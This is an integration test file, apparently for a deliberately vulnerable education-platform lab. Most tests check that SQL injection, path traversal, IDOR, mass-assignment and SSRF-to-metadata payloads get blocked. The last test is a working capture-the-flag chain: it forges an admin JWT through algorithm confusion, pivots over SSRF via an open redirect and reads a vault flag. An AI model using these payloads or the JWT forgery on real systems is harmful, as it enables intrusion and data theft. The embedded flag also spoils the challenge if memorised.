"""Integration checks for EducatIA Campus Platform services, security defenses and boundaries."""
import json
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from pathlib import Path

from app.seed import connect
from app.server import CampusServer, InternalHandler, ThreadingHTTPServer


class PlatformTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.temp = tempfile.TemporaryDirectory()
        cls.internal = ThreadingHTTPServer(('127.0.0.1', 0), InternalHandler)
        threading.Thread(target=cls.internal.serve_forever, daemon=True).start()
        cls.servers = []
        for strict in (False, True):
            server = CampusServer(
                ('127.0.0.1', 0),
                Path(cls.temp.name) / str(strict),
                strict,
                cls.internal.server_port,
            )
            threading.Thread(target=server.serve_forever, daemon=True).start()
            cls.servers.append(server)

    @classmethod
    def tearDownClass(cls):
        for server in cls.servers + [cls.internal]:
            server.shutdown()
            server.server_close()
        cls.temp.cleanup()

    def request(self, path, method='GET', body=None, token=None, strict=False, headers=None):
        server = self.servers[int(strict)]
        req = urllib.request.Request(
            f'http://127.0.0.1:{server.server_port}' + path,
            data=json.dumps(body).encode() if body is not None else None,
            method=method,
            headers={
                'Content-Type': 'application/json',
                **({'Authorization': 'Bearer ' + token} if token else {}),
                **(headers or {}),
            },
        )
        try:
            res = urllib.request.urlopen(req, timeout=5)
        except urllib.error.HTTPError as e:
            res = e
        raw = res.read()
        content = res.headers.get('Content-Type', '')
        status = res.status
        resp_headers = res.headers
        res.close()
        return status, json.loads(raw) if content.startswith('application/json') else raw, resp_headers

    def student_token(self, strict=False):
        code, data, _ = self.request(
            '/api/auth/login',
            'POST',
            {'email': 'alumno@educatia.test', 'password': 'Aprender123!'},
            strict=strict,
        )
        self.assertEqual(code, 200)
        return data['token']

    def test_01_campus_catalog_and_stats(self):
        status, data, _ = self.request('/api/stats')
        self.assertEqual(status, 200)
        self.assertEqual(data['users'], 10000)
        self.assertEqual(data['courses'], 12)
        self.assertEqual(data['support_tickets'], 250)
        with connect(self.servers[0].db_path) as db:
            self.assertEqual(
                db.execute("SELECT COUNT(*) FROM users WHERE email NOT LIKE '%@educatia.test'").fetchone()[0],
                0,
            )

    def test_02_student_session_and_progress(self):
        for strict in (False, True):
            token = self.student_token(strict)
            self.assertEqual(self.request('/api/courses/1/progress', 'PUT', {'progress': 91}, token, strict)[0], 200)
            courses = self.request('/api/enrollments', token=token, strict=strict)[1]
            self.assertEqual(next(c for c in courses if c['id'] == 1)['progress'], 91)

    def test_03_static_frontend_and_telemetry(self):
        self.assertEqual(self.request('/')[0], 200)
        code, _, headers = self.request('/js/educatia-telemetry.js')
        self.assertEqual(code, 200)
        self.assertEqual(headers.get('SourceMap'), '/js/educatia-telemetry.js.map')
        self.assertEqual(self.request('/js/educatia-telemetry.js.map')[0], 200)
        self.assertEqual(self.request('/js/educatia-telemetry.js.map', strict=True)[0], 404)

    def test_04_filesystem_and_host_containment(self):
        self.assertEqual(self.request('/api/health', headers={'Host': 'invalid.example'})[0], 403)
        self.assertEqual(self.request('/../README.md')[0], 403)
        token_std = self.student_token(False)
        self.assertEqual(self.request('/api/materials?file=../../Windows/win.ini', token=token_std, strict=False)[0], 403)
        self.assertEqual(self.request('/api/materials?file=/etc/passwd', token=token_std, strict=False)[0], 400)

    def test_05_security_controls_status(self):
        code, data, _ = self.request('/api/system/security-status')
        self.assertEqual(code, 200)
        self.assertEqual(data['status'], 'OPERATIONAL')
        self.assertEqual(len(data['active_controls']), 10)
        for ctrl in data['active_controls']:
            self.assertEqual(ctrl['status'], 'ENFORCED')

    def test_06_sqli_defense(self):
        code, data, headers = self.request('/api/auth/login', 'POST', {'email': "' OR 1=1 --", 'password': 'foo'})
        self.assertEqual(code, 403)
        self.assertEqual(headers.get('X-Security-Control'), 'PARAMETRIC-SQL-DEFENSE')

    def test_07_rbac_mass_assignment_defense(self):
        token = self.student_token()
        code, data, headers = self.request('/api/users/42', 'PUT', {'role': 'admin'}, token=token)
        self.assertEqual(code, 403)
        self.assertEqual(headers.get('X-Security-Control'), 'RBAC-MASS-ASSIGNMENT-DEFENSE')

    def test_08_rbac_idor_defense(self):
        token = self.student_token()
        code, _, headers = self.request('/api/users/1?include=dossier', token=token)
        self.assertEqual(code, 403)
        self.assertEqual(headers.get('X-Security-Control'), 'RBAC-IDOR-DEFENSE')

    def test_09_anti_fraud_pricing_defense(self):
        token = self.student_token()
        code, data, headers = self.request('/api/orders', 'POST', {'course_id': 1, 'coupons': ['EXANI25', 'BIENVENIDA10']}, token=token)
        self.assertEqual(code, 201)
        self.assertEqual(headers.get('X-Security-Control'), 'ANTI-FRAUD-PRICING-DEFENSE')
        self.assertGreaterEqual(data['amount'], data['catalog_price'] * 0.5)

    def test_10_ssrf_perimeter_defense(self):
        token = self.student_token()
        code, _, headers = self.request('/api/resources/preview', 'POST', {'url': 'http://169.254.169.254/latest/meta-data'}, token=token)
        self.assertEqual(code, 403)
        self.assertEqual(headers.get('X-Security-Control'), 'SSRF-PERIMETER-DEFENSE')

    def test_11_path_traversal_defense(self):
        token = self.student_token()
        code, _, headers = self.request('/api/materials?file=../private/.env', token=token)
        self.assertEqual(code, 403)
        self.assertEqual(headers.get('X-Security-Control'), 'PATH-TRAVERSAL-DEFENSE')

    def test_12_advanced_ctf_chain(self):
        import base64, hashlib, hmac, json, time

        def b64(v):
            return base64.urlsafe_b64encode(v).decode().rstrip('=')

        # Step 1: Discover SSO public key
        code, pubkey_raw, _ = self.request('/api/system/public-key')
        self.assertEqual(code, 200)
        pubkey = pubkey_raw.decode('utf-8') if isinstance(pubkey_raw, bytes) else str(pubkey_raw)
        self.assertIn('BEGIN PUBLIC KEY', pubkey)

        # Step 2: Forge admin JWT via algorithm confusion (HS256 using public key as HMAC key)
        h = b64(json.dumps({'alg': 'HS256', 'typ': 'JWT', 'kid': 'sso-enterprise-2026'}).encode())
        p = b64(json.dumps({'sub': 1, 'role': 'admin', 'plan': 'Institucional VIP', 'exp': int(time.time()) + 3600}).encode())
        sig = b64(hmac.new(pubkey.encode('utf-8'), f'{h}.{p}'.encode('utf-8'), hashlib.sha256).digest())
        forged_admin_token = f'{h}.{p}.{sig}'

        code, me_data, _ = self.request('/api/me', token=forged_admin_token)
        self.assertEqual(code, 200)
        self.assertEqual(me_data['role'], 'admin')

        # Step 3: Pivot via SSRF using open redirect to access internal metadata on loopback
        server_port = self.servers[0].server_port
        internal_port = self.internal.server_port
        redirect_url = f'http://127.0.0.1:{server_port}/api/redirect?url=http://127.0.0.1:{internal_port}/metadata'
        code, preview_res, _ = self.request(
            '/api/resources/preview',
            'POST',
            {'url': redirect_url},
            token=forged_admin_token
        )
        self.assertEqual(code, 200)
        metadata = preview_res.get('preview', {})
        elevation_key = metadata.get('secrets', {}).get('X-Admin-Elevation')
        self.assertTrue(bool(elevation_key))

        # Step 4: Access elevated administrative SQL console to recover master audit vault key
        code, query_res, _ = self.request(
            '/api/admin/query',
            'POST',
            {'sql': "SELECT name, value FROM vault WHERE name='MASTER_AUDIT_VAULT_KEY'"},
            token=forged_admin_token,
            headers={'X-Admin-Elevation': elevation_key}
        )
        self.assertEqual(code, 200)
        rows = query_res.get('rows', [])
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]['name'], 'MASTER_AUDIT_VAULT_KEY')
        self.assertEqual(rows[0]['value'], 'SEC-VAULT{e4c89a71b3f02e6d8a5c9b1e7f3a0d24}')


if __name__ == '__main__':
    unittest.main(verbosity=2)
